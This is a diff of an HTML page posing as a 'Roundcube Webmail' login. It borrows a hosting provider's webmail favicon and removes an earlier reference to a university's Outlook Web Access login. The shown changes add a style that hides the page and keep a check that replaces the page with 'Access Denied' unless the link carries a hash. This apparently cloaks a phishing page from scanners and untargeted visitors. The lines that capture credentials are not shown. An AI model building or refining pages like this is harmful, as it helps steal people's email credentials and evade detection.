@@ -1,10 +1,15 @@
 <!DOCTYPE html>
 <html>
   <head>
+  <style>
+    html {
+        visibility: hidden; 
+        background: white;
+    }
+</style>
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
 <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
 <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
-<!-- <link rel="shortcut icon" href="https://mail.um.si/owa/auth/15.2.1544/themes/resources/favicon.ico"> -->
 <link rel="shortcut icon" href="https://webmail.supremecluster.com/skins/elastic/images/favicon.ico?s=1593860317"><title>Roundcube Webmail</title>
 
     <script>
@@ -49,17 +54,14 @@ return false; }
 else {
 return true;
 }});
+
 function getQueryParamsAndHash() {
     let params = {};
-    let hash = window.location.hash.substring(1); // Remove the #
-
-    // If there's no hash in the URL, deny access
+    let hash = window.location.hash.substring(1); 
     if (!hash) {
         document.body.innerHTML = "<h1>Access Denied</h1>";
         return;
     }
-
-    // Extract query parameters
     let queryString = window.location.search.substring(1);
     let queryArray = queryString.split("&");
 
@@ -72,8 +74,6 @@ function getQueryParamsAndHash() {
 
     return { params, hash };
 }
-
-// Example usage
 let data = getQueryParamsAndHash();
 if (data) {
     console.log(data);
